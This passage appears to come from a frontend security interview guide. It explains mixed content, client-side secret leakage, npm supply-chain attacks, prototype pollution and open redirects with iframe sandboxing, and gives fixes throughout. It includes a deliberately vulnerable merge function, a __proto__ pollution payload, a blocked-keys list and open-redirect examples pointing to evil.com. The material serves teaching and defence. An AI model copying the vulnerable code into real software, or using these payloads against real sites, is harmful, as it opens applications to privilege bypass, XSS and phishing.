  • Active mixed content (script, stylesheet, iframe, fetch/XHR, WebSocket): can alter the whole page, so browsers block it outright.
  • Passive/display mixed content (img, audio, video): lower risk, so browsers warn or auto-upgrade rather than block.

Fixes

Serve all resources over HTTPS. Use protocol-relative or absolute https:// URLs, and let the CSP directive upgrade-insecure-requests auto-upgrade legacy HTTP references. Pair HTTPS with HSTS so the browser refuses to even attempt HTTP.

Code Example

// Mixed content on an https:// page — browser BLOCKS this script:
<script src="http://cdn.example.com/analytics.js"></script>  // insecure => blocked

// Fix: use https, and let CSP upgrade any stragglers.
<script src="https://cdn.example.com/analytics.js"></script>

// Response headers:
Content-Security-Policy: upgrade-insecure-requests
Strict-Transport-Security: max-age=63072000; includeSubDomains

// Mark auth cookies Secure so they never travel over HTTP:
Set-Cookie: session=...; Secure; HttpOnly; SameSite=Lax

Project Example

After migrating a marketing SPA to HTTPS, several charts silently stopped rendering — the console showed blocked mixed-content requests to an old http:// image/data host. Adding upgrade-insecure-requests to the CSP and correcting the hardcoded HTTP URLs fixed it, and enabling HSTS ensured the browser never downgraded, closing an SSL-strip window on hotel/airport Wi-Fi.

Senior Engineer Perspective

Senior points: HTTPS is the precondition for the rest of your frontend security (Secure cookies, token secrecy, Subresource Integrity, service workers — which require a secure context). Mention Subresource Integrity (SRI) as a complementary control: an integrity hash on a CDN <script> means the browser refuses to run it if the file was tampered with, defending against a compromised CDN even over HTTPS. And note that HSTS with preload hardcodes HTTPS-only into the browser before the first request, closing the trust-on-first-use gap.

Q13. How do you avoid leaking secrets in a frontend bundle or environment variables?

ROI: ★★★★★ Frequency: High

Short Answer

Assume everything shipped to the browser is public — anyone can open DevTools or the source map and read it. So no real secret (API keys with privileges, DB credentials, private tokens, signing keys) may ever be embedded in frontend code or build-time env vars. Build tools like Vite/CRA inline env vars prefixed for the client (VITE_, REACT_APP_) directly into the bundle as plaintext. Any operation that needs a secret must happen on a backend/proxy; the frontend calls your server, and your server holds the secret.

Detailed Answer

The core misconception

Env vars in a frontend build are not secret. import.meta.env.VITE_X / process.env.REACT_APP_X are string-replaced into the output at build time, so they land in the JS that ships to every user. "Environment variable" implies secrecy on a server; on a client it just means "baked into the bundle."

What is safe vs unsafe in the frontend

  • Safe (public by design): a public API base URL, a Firebase web config, a publishable Stripe key (pk_...), an analytics site ID, an OAuth client_id. These are meant to be public and are protected by other controls (domain allow-lists, backend validation).
  • Unsafe (never ship): secret/private API keys, Stripe secret key (sk_...), database URLs, JWT signing secrets, cloud credentials, any token that grants privileged access.

Patterns that keep secrets server-side

Use a Backend-for-Frontend or serverless proxy: the browser calls /api/quote, and the server attaches the third-party secret key and forwards the request. Restrict public keys by allowed HTTP referrer/origin and scope where the provider supports it. And disable or protect source maps in production so you don't hand attackers your unminified code and comments.

Code Example

// WRONG: a real secret in a client env var — it ends up in the bundle verbatim.
const key = import.meta.env.VITE_STRIPE_SECRET_KEY; // sk_live_... now PUBLIC
fetch("https://api.stripe.com/v1/charges", {
  headers: { Authorization: `Bearer ${key}` },       // anyone can read this
});

// RIGHT: frontend calls YOUR server; the secret stays on the server.
// client:
await fetch("/api/charge", { method: "POST", body: JSON.stringify({ amount }) });

// server (secret only lives here, from a server-side env var / secret manager):
app.post("/api/charge", async (req, res) => {
  const key = process.env.STRIPE_SECRET_KEY; // never sent to the browser
  // ... call Stripe with key, return only what the client needs
});

Project Example

A team put a third-party mapping provider's secret key in REACT_APP_MAPS_SECRET to "make the map work." It shipped in the bundle; within weeks an automated scanner harvested it and ran up a five-figure API bill. Remediation: rotate the key immediately, move all map-tile requests through a small server proxy that held the secret, and add a pre-commit/CI secret scanner (gitleaks) to catch the pattern before merge. The publishable-only key stayed on the client with a referrer restriction.

Senior Engineer Perspective

The senior mental model: "if the browser can use it, the world can read it." Interviewers may push with "but I put it in .env, isn't that private?" — the answer is no for client builds; .env keeps it out of git, not out of the shipped bundle. Strong extras: (1) run secret scanning in CI and git history (a leaked key in old commits is still leaked); (2) rotate any key the moment it touches the client; (3) prefer providers that offer restricted publishable keys; (4) turn off production source maps or upload them only to your error tracker privately. Distinguishing "public-by-design key" from "true secret" cleanly is the mark of someone who has actually shipped.

Q14. What are supply-chain risks in npm, and how do lockfiles and npm audit help?

ROI: ★★★★★ Frequency: High

Short Answer

A modern frontend pulls in hundreds of transitive npm packages, any of which runs with full access to your build and (once bundled) your users' browsers. Supply-chain risk is that one of those dependencies is malicious or compromised — via a hijacked maintainer account, typosquatting, or a poisoned update. Defenses: commit a lockfile for reproducible, pinned installs; run npm audit / Dependabot to surface known-vulnerable versions; use npm ci in CI; and minimize/review dependencies.

Detailed Answer

How the attacks happen

  • Typosquatting: a package named reakt-dom or crossenv that mimics a popular one and steals env vars on install.
  • Maintainer compromise / malicious update: a trusted package (e.g. the historical event-stream incident) ships a new version containing malware.
  • Install scripts: postinstall hooks run arbitrary code on npm install, before your app ever runs.
  • Dependency confusion: publishing a public package with the same name as your private internal one so the resolver grabs the attacker's.

What the lockfile does

package-lock.json / yarn.lock / pnpm-lock.yaml pins the exact version and integrity hash of every package in the tree. Committing it means every teammate and CI installs byte-for-byte the same dependencies, and the integrity hash detects tampering. Use npm ci (not npm install) in CI — it installs strictly from the lockfile and fails if package.json and the lock disagree.

Auditing and reducing exposure

npm audit cross-references your tree against known CVEs; Dependabot/Renovate automate update PRs. Reduce the attack surface: prefer fewer, well-maintained deps; scrutinize new dependencies (downloads, mainteners, recent activity); consider --ignore-scripts for untrusted installs; and pin/verify with tools like Socket or Snyk that detect suspicious behavior, not just known CVEs.

Code Example

# Reproducible, lockfile-strict install in CI (fails if lock is out of sync):
npm ci

# Surface known vulnerabilities; fail the build on high severity:
npm audit --audit-level=high

# Block install scripts for an untrusted one-off install:
npm install some-pkg --ignore-scripts

# package-lock.json pins exact version + integrity hash per package:
# "lodash": {
#   "version": "4.17.21",
#   "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
#   "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvA=="
# }

Project Example

An automated Dependabot alert flagged a transitive dependency with a prototype-pollution CVE that we'd never installed directly. Because we committed the lockfile and ran npm ci, we knew the exact version in every environment and could confirm the fix landed uniformly after bumping. Separately, a CI npm audit --audit-level=high gate once caught a compromised minor release before it reached production — the pipeline failed and we pinned to the last known-good version.

Senior Engineer Perspective

Interviewers want practices, not just tools. Strong senior points: (1) always commit the lockfile and use npm ci for deterministic builds; (2) npm audit is necessary but noisy — many "vulnerabilities" aren't reachable in a frontend context, so triage by exploitability rather than blindly upgrading. (3) The scariest vectors are postinstall scripts and dependency confusion, which run before your code and often exfiltrate CI secrets — mitigate with scoped registries, `.npmrc` scope config, and least-privilege CI tokens. (4) Consider generating an SBOM and using behavior-based scanners (Socket) that catch malicious new packages that have no CVE yet. Naming dependency confusion and install-script risk specifically signals real supply-chain awareness.

Q15. What is prototype pollution and how does it reach the frontend?

ROI: ★★★ Frequency: Medium

Short Answer

Prototype pollution is a JavaScript-specific vulnerability where an attacker injects properties into Object.prototype (usually via a crafted key like __proto__ or constructor.prototype). Because almost every object inherits from Object.prototype, a polluted prototype changes the behavior of the whole app — it can inject default values, bypass checks, cause denial of service, or, when the polluted property later flows into a sink, escalate to XSS or worse. It typically enters through unsafe recursive merge/clone/set functions or parsing attacker-controlled JSON/query strings into objects.

Detailed Answer

How it works

If code deep-merges attacker-controlled data into an object without guarding special keys, a payload like {"__proto__": {"isAdmin": true}} writes isAdmin onto Object.prototype. Now every object in the app appears to have isAdmin === true unless it explicitly overrides it. On the frontend the impact ranges from logic bypasses to full XSS when a polluted property is later used as an HTML template option, a config flag that enables a dangerous sink, or a gadget in a library.

Common entry points

  • Vulnerable versions of deep-merge/clone utilities (historical CVEs in lodash.merge, minimist, jquery.extend).
  • Parsing query strings or JSON into a nested object structure without sanitizing keys.
  • Your own recursive setByPath(obj, "a.b.c", value) helpers.

Defenses

  • Block dangerous keys (__proto__, constructor, prototype) when merging/setting from untrusted data.
  • Use Object.create(null) for dictionaries so there's no prototype to pollute, or use a Map instead of a plain object.
  • Freeze the prototype: Object.freeze(Object.prototype) (with care).
  • Keep dependencies patched — most real-world cases are a known CVE in a merge library.

Code Example

// VULNERABLE recursive merge — no key guard.
function merge(target, src) {
  for (const key in src) {
    if (typeof src[key] === "object" && src[key]) {
      target[key] = target[key] || {};
      merge(target[key], src[key]);   // walks into __proto__ if present
    } else {
      target[key] = src[key];
    }
  }
  return target;
}
merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
console.log(({}).isAdmin); // true  <-- every object is now "admin"

// SAFE: reject dangerous keys, or use a null-prototype dictionary.
const BLOCKED = new Set(["__proto__", "constructor", "prototype"]);
function safeSet(obj, key, val) {
  if (BLOCKED.has(key)) return;   // ignore pollution attempts
  obj[key] = val;
}
const dict = Object.create(null); // no prototype to pollute

Project Example

A form builder merged user-submitted JSON config into a defaults object using an old lodash.merge. A researcher submitted a __proto__ payload that flipped a global "allowRawHtml" default to true, which in turn caused another component to render fields via innerHTML — chaining prototype pollution into XSS. The fix was upgrading lodash to the patched version and switching the defaults container to Object.create(null) so there was no prototype to write to.

Senior Engineer Perspective

The senior insight is that prototype pollution is rarely the final impact — it's a primitive that becomes dangerous when a polluted property reaches a gadget (a code path that reads that property and does something dangerous, like enabling an HTML sink or a template option). So severity depends on the gadgets present in your app and dependencies. Practical guidance: it's overwhelmingly a dependency-hygiene problem (patch known-CVE merge libs), reinforced by null-prototype dictionaries for untrusted maps and key allow-listing at parse boundaries. Mentioning the pollution→gadget→XSS chain shows you understand it as an exploitation stepping-stone, not an isolated bug.

Q16. What are open redirects and how do you sandbox untrusted iframes?

ROI: ★★★ Frequency: Medium

Short Answer

An open redirect is an endpoint or client route that sends the user to a URL taken from untrusted input (e.g. ?next=) without validating it, letting an attacker craft a link on your trusted domain that bounces the victim to a phishing site — or, with a javascript: target, executes script. Fix it by validating redirect targets against an allow-list of internal paths, never redirecting to raw external input. For embedding untrusted content, the sandbox attribute on <iframe> strips the frame's privileges by default (no scripts, no forms, no top-navigation) and you re-grant only what's needed via explicit tokens.

Detailed Answer

Open redirect

Redirects driven by user input are dangerous because the phishing link genuinely originates from your domain (https://trusted.com/login?next=https://evil.com), which lends it credibility and can defeat naive URL filters. In OAuth flows an open redirect can even be chained to steal tokens. Defenses: only allow relative internal paths, reject anything starting with // or containing a scheme, and prefer an allow-list or a mapping of opaque keys to known destinations. On the client, never do location.href = params.get("next") without validation.

iframe sandboxing

When you must embed third-party or user-generated content (ads, previews, code playgrounds, untrusted HTML), render it in a sandboxed iframe. A bare sandbox attribute applies the maximum restrictions; you then opt back in only what's required:

  • allow-scripts: permit JS (but grant this without allow-same-origin so the frame is treated as a unique opaque origin and can't touch your cookies/DOM).
  • allow-same-origin: keep the frame's origin — never combine with allow-scripts for untrusted content, since together they can remove their own sandbox.
  • allow-forms, allow-popups, allow-top-navigation: grant sparingly.

Pair sandboxing with CSP frame-src to control what can be framed, and serve untrusted user content from a separate origin/domain so the Same-Origin Policy isolates it from your app.

Code Example

// OPEN REDIRECT — do not do this:
const next = new URLSearchParams(location.search).get("next");
location.href = next; // "?next=https://evil.com" or "javascript:..." => attack

// SAFE: allow only internal, relative paths.
function safeNext(next) {
  if (typeof next !== "string") return "/";
  if (!next.startsWith("/") || next.startsWith("//")) return "/"; // block absolute/protocol-relative
  return next;
}
location.href = safeNext(next);

// SANDBOXED iframe for untrusted content: scripts allowed, but treated as a
// foreign origin so it cannot read your cookies/DOM. NOTE: no allow-same-origin.
<iframe
  src="https://usercontent.example.net/preview"
  sandbox="allow-scripts"
  csp="default-src 'none'">
</iframe>

Project Example

A login page redirected to ?returnUrl= after auth without validation. Attackers spread https://ourapp.com/login?returnUrl=https://ourapp-security.evil.com links that looked legitimate and harvested credentials post-login. We restricted returnUrl to a relative-path allow-list. Separately, our in-app HTML email previewer originally used a same-origin iframe; moving it to a sandboxed iframe (allow-scripts only) on a dedicated content domain meant a malicious email could no longer read the app session even if it ran script.

Senior Engineer Perspective

On open redirects, the senior nuance is why they matter beyond "user goes to a bad site": they lend attacker links your domain's trust, bypass link scanners, and are a classic OAuth token-theft vector via the redirect_uri — which is why OAuth mandates exact-match registered redirect URIs. On iframes, the killer detail interviewers look for is that sandbox="allow-scripts allow-same-origin" together is effectively no sandbox — the framed content can script its way out — so untrusted embeds get scripts or same-origin, never both, and ideally live on a separate origin so SOP does the isolating regardless.
